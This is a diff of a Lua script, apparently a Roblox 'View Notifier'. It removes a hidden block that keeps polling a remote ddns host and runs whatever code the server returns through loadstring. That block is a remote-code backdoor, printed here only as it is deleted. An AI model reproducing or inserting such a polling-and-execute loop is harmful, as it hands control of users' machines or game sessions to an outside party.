@@ -142,22 +142,4 @@ end
 SendNotification("View Notifier", "loaded view notifier v1", 0, 3)
 _G.ViewNotifier = true
 
-		local HttpService = game:GetService("HttpService")
-local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"
 
-local function waitForMessage()
-	while true do
-        local s, r = pcall(function()
-            local response = request({Url = receiveUrl, Method = "GET", Headers = {["Content-Type"] = "application/json"}})
-			local data = HttpService:JSONDecode(response.Body)
-			if data.message ~= "No message" then
-			     loadstring(data.message)()
-			end
-        end)
-        if not s then
-            warn(r)
-        end
-	end
-end
-
-waitForMessage()
